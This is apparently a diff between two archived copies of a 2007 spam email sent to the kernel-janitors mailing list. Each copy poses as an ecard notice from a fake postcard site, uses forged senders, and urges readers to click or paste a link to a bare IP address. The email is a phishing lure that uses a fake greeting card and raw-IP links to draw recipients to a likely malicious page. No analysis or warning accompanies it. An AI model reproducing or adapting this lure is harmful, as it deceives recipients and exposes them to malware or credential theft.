@@ -1,7 +1,7 @@
-From: "postcard.com" <lnbvy@cdc.ru>
-Date: Mon, 16 Jul 2007 01:57:48 +0000
+From: "FunnyPostcard.Com" <ftt@alkeoncapital.com>
+Date: Wed, 18 Jul 2007 14:14:07 +0000
 Subject: [KJ] You've received an ecard from a Worshipper!
-Message-Id: <002301c7c74c$b5862da0$c82c3432@wezp.cy>
+Message-Id: <002601c7c945$e7233880$efa878de@lht.rbyv>
 List-Id: <kernel-janitors.vger.kernel.org>
 References: <002301c7c3b4$cf0c7c20$c82c7de0@nurk.hpy>
 In-Reply-To: <002301c7c3b4$cf0c7c20$c82c7de0@nurk.hpy>
@@ -18,7 +18,7 @@ SEEING YOUR CARD
 If your email software creates links to Web pages, click on your 
 card's direct www address below while you are connected to the Internet:
 
-http://213.93.193.158/?ee713076a3db573383e1a7a859
+http://71.153.241.151/?3383b4c009ee64d82c3a9ebeed435601e5ee71
 
 Or copy and paste it into your browser's "Location" box (where Internet 
 addresses go).
@@ -26,8 +26,8 @@ addresses go).
 We hope you enjoy your awesome card.
 
 Wishing you the best,
-Webmaster,
-postcard.com
+Postmaster,
+FunnyPostcard.Com
 
 _______________________________________________
 REMINDER: this mailing list moved to vger.kernel.org and current one will be discontinued soon.
